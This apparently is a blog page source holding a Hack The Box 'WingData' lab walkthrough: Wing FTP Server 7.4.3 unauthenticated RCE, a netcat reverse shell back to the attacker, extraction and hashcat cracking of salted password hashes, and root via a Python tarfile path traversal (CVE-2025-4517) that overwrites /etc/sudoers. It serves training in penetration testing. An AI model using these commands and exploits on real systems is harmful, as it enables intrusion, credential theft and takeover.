@@ -1,0 +1,195 @@
+export const frontmatter = {
+  title: "Hack The Box WingData Machine Writeup",
+  slug: "hack-the-box-wingdata-machine-writeup",
+  category: "HTB Machine",
+  description:
+    "Complete walkthrough of the Hack The Box WingData machine, covering Wing FTP Server 7.4.3 unauthenticated remote code execution, extraction and cracking of salted SHA-256 password hashes, SSH foothold, and root privilege escalation via the Python tarfile path traversal vulnerability (CVE-2025-4517).",
+  date: "2026-06-28",
+};
+
+export const metadata = {
+  title:
+    "Hack The Box WingData Writeup | Wing FTP RCE to Root via Python tarfile Path Traversal | loxcalhost",
+  description:
+    "Step-by-step Hack The Box WingData writeup demonstrating exploitation of Wing FTP Server 7.4.3 unauthenticated RCE, credential extraction from XML files, cracking salted SHA-256 password hashes, obtaining user access, and privilege escalation using Python tarfile path traversal (CVE-2025-4517).",
+};
+
+## Introduction
+
+WingData chains together a public RCE in a self-hosted FTP server, salted hash cracking, and a recent Python tarfile vulnerability — a realistic path that mirrors real-world supply chain attack surfaces.
+
+## Setup
+
+Grab IP address from the Machine page, and edit the hosts file under `/etc/hosts` to add a line `<ip_addr>	wingdata.htb` this is done because local system could resolve the domain name to the target machine. The target web server may use virtual host configuration, meaning it serves the intended application only when the correct hostname is provided in the HTTP request
+
+> **NOTE:** We will further need to modify the `/etc/hosts`
+
+Now download a VPN configuration file from webpage and connect to it via `sudo openvpn file.ovpn`
+
+> **NOTE:** Replace `file.ovpn` with your VPN configuration file name
+
+To check if everything is working fine, we can use `ping <ip_addr>`
+
+## Enumeration
+
+Start a basic port scan with nmap with `nmap -sV -T4 <ip_addr>` which gives us
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-18 00:53 IST
+Nmap scan report for wingdata.htb (10.129.255.69)
+Host is up (0.42s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.66
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.65 seconds
+```
+
+This reveals that the machine is running `ssh` and a `http` service 
+
+Visiting `10.129.255.69` redirects to web app on `http://wingdata.htb`
+
+Which is a file sharing platform, with only interactive thing being the contact form, which if possible could be exploited, but upon checking the websites source code with `CTRL + U` and inspecting it with dev tools, it shows us that it's just a dummy form
+
+While analyzing the page source code, an interesting subdomain was identified: `http://ftp.wingdata.htb/login.html`. This endpoint appears to host a Wing FTP Server instance, specifically running version 7.4.3.
+
+> To access `http://ftp.wingdata.htb/login.html` you will need to add `<ip_addr> ftp.wingdata.htb` in `/etc/hosts`
+
+We can look for its existing vulnerabilities with `searchsploit wing ftp 7.4.3` which returns `Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution  (RCE)`
+
+So we can google to check if it has a public exploit on [Exploit DB](https://www.exploit-db.com/exploits/52347)
+
+We can save the file as `main.py` and check it with `python main.py -h` that gives us, that it needs Target URI and a command
+
+We can check if server is vulnerable with `python main.py -u <target_uri>`:
+```
+[*] Testing target: http://ftp.wingdata.htb
+[+] http://ftp.wingdata.htb is vulnerable!
+```
+
+We can perform a basic check with `-c whoami`
+```
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'whoami' and username: 'anonymous'
+[+] UID extracted: fabd...<SNIP>...b8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: fabd...<SNIP>...b8d6
+
+--- Command Output ---
+wingftp
+----------------------
+```
+
+It was successful
+
+## Foothold
+
+So we can execute a reverse shell command on the remote server with `python main.py -u http://ftp.wingdata.htb -c "nc -c sh <ip_addr> <port>"`
+
+We will need to start a listener by `nc -lvnp <port>`
+
+> **NOTE:** We can get IP address with `ip a` and choose the desired port number
+
+> **NOTE:** There are other methods to get a reverse shell connection, check [here](https://www.revshells.com/)
+
+And upon running the python file we will get `connect to [10.10.14.37] from (UNKNOWN) [10.129.255.108] 38950` on listener terminal
+
+To stabilize the shell use `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+
+> **NOTE:** Shell stabilization steps may vary depending on your environment
+
+## Internal Enumeration
+
+[Wing FTP Server Documentation](https://www.wftpserver.com/help/ftpserver/index.html?data_storage.htm) this reveals that credentials are stored in `.xml` files
+
+To find `.xml` files on server we will use `find . -type f -name "*.xml" 2>/dev/null`:
+```
+./Data/_ADMINISTRATOR/admins.xml
+./Data/_ADMINISTRATOR/settings.xml
+./Data/1/users/maria.xml
+./Data/1/users/steve.xml
+./Data/1/users/wacky.xml
+./Data/1/users/anonymous.xml
+./Data/1/users/john.xml
+./Data/1/settings.xml
+./Data/1/portlistener.xml
+./Data/settings.xml
+./webadmin/crossdomain.xml
+```
+
+Upon checking those `.xml` files it reveals a line that contains a password hash
+
+We can use `grep -r "<Password>" --include="*.xml" .` to get all passwords hash
+
+These hashes can have a salt to confirm it we can check `settings.xml` file and it reveals:
+```
+<EnablePasswordSalting>1</EnablePasswordSalting>
+<SaltingString>WingFTP</SaltingString>
+```
+> **NOTE:** Passwords in Wing FTP Server are saved using SHA256 hash encryption by default, but they can also be stored using MD5 hash if the option is disabled.
+
+Save the hashes in a file named `hash.txt` as `<hash>:<salt>`
+
+So, to crack the hash we can use `hashcat` as `hashcat -m 1410 -a 0 hash.txt rockyou.txt`
+- `-m 1410` here `-m` for hash type and `1410` corresponds to `sha256($pass.$salt)`
+- `-a 0` here `-a` sets the attack mode to use and in this case `0` means `straight`
+- Here `hash.txt` is our file that contains our hash and `rockyou.txt` is our wordlist
+
+Upon completion we can see if it has cracked or not with `hashcat -m 1410 -a 0 hash.txt rockyou.txt --show` and it reveals that we have successfully cracked the password
+
+We can switch to wacky with `su wacky` when asked enter the password cracked from the hash and once logged in we can check with `whoami`
+
+Now that we have a shell as `wacky`, we can grab the user flag at `/home/wacky/user.txt`
+
+## Privilege Escalation
+
+We can check sudo permissions with `sudo -l` which returns
+```
+Matching Defaults entries for wacky on wingdata:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User wacky may run the following commands on wingdata:
+    (root) NOPASSWD: /usr/local/bin/python3
+        /opt/backup_clients/restore_backup_clients.py *
+```
+
+This shows us that `/opt/backup_clients/restore_backup_clients.py` file can be executed as a root without password
+
+We can view contents of file with `cat /opt/backup_clients/restore_backup_clients.py` and we can check its supported options with `cat /opt/backup_clients/restore_backup_clients.py -h` which returns `-b` and `-r`
+
+The script accepts a tar file via `-b` and extracts it as root using Python's `tarfile` module. While the script validates the filename format, it cannot sanitize the contents of the archive itself. Since `Python 3.12.3` is vulnerable to [CVE-2025-4517](https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f) — a path traversal flaw in the tarfile module, we can craft a malicious tar that writes files outside the intended restore directory, effectively giving us arbitrary file write as root
+
+In `/opt/backup_clients/backups` we will create a directory with name `restore_wacky`
+
+And with help of [POC Code](https://github.com/StealthByte0/CVE-2025-4517-poc) we will create a malicious tar file for our use
+
+With 
+```
+cat << 'EOF' > exploit.py
+
+...<Paste_POC_Code_Here>...
+
+EOF
+```
+we can write our code to a file via terminal with name `exploit.py`
+
+Running `python3 exploit.py` will create a malicious tar file
+
+`exploit.py` creates a deep nested directory structure with a symlink loop, then creates a hardlink entry pointing to `escape/sudoers`. When the script extracts the tar as root, the path traversal causes it to overwrite `/etc/sudoers`, granting `wacky` unrestricted sudo access.
+
+And to escalate our privileges use `sudo python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_wacky` while being in `/opt/backup_clients/backups`
+
+## Post-Exploitation
+
+To get to root use `sudo su -`
+
+And we can grab the root flag with `cat /root/root.txt`
+
+## Lessons Learned
+
+- Always check service version numbers against searchsploit before manual enumeration
+- Salted hashes require identifying the correct hashcat mode — confirm salting config before cracking
+- Standard library functions can be vulnerability sources; CVE-2025-4517 shows that even trusted modules like `tarfile` can be exploited when running as a privileged user
